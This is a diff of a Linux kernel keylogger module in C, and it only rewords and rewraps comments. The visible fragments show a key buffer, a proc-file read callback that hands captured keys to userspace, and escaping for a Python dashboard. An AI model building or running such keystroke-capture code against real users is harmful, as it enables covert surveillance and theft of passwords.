@@ -22,9 +22,10 @@ static char key_buffer[LOG_BUF_SIZE]; // Buffer to store a sequence of keys
 static int key_index = 0; // Tracks how many keys were stored so far
 
 /**
- * @brief Reads captured keys from the proc file (kernelspace) to user space.
+ * @brief Reads captured keys from the proc file (kernelspace) to userspace
  * 
- * Copies the current key buffer to the user space buffer and resets the internal buffer so only new keys are sent next time.
+ * Copies the current key buffer to the userspace buffer and resets 
+ * the internal buffer so only new keys are sent next time
  * 
  * @param file  Pointer to the open proc file
  * @param buf   Userspace buffer where we copy the keys to
@@ -61,7 +62,7 @@ static ssize_t keylogger_read(struct file *file, char __user *buf, size_t count,
 
 static const struct proc_ops keylogger_proc_ops =
 {
-    .proc_read = keylogger_read, // Tell the proc filesystem to use my read function when someone cat's the file (callback)
+    .proc_read = keylogger_read, // Tell the proc filesystem to use my read function when userspace reads the file (callback)
 };
 
 /**
@@ -107,7 +108,8 @@ static void append_token(const char *token)
 /**
  * @brief Logs printable ASCII characters
  * 
- * Filters for standard ASCII characters and escapes brackets to help the Python dashboard parse them later
+ * Filters for standard ASCII characters and escapes brackets
+ * to help the Python dashboard parse them later
  * 
  * @param v The key value to log
  */
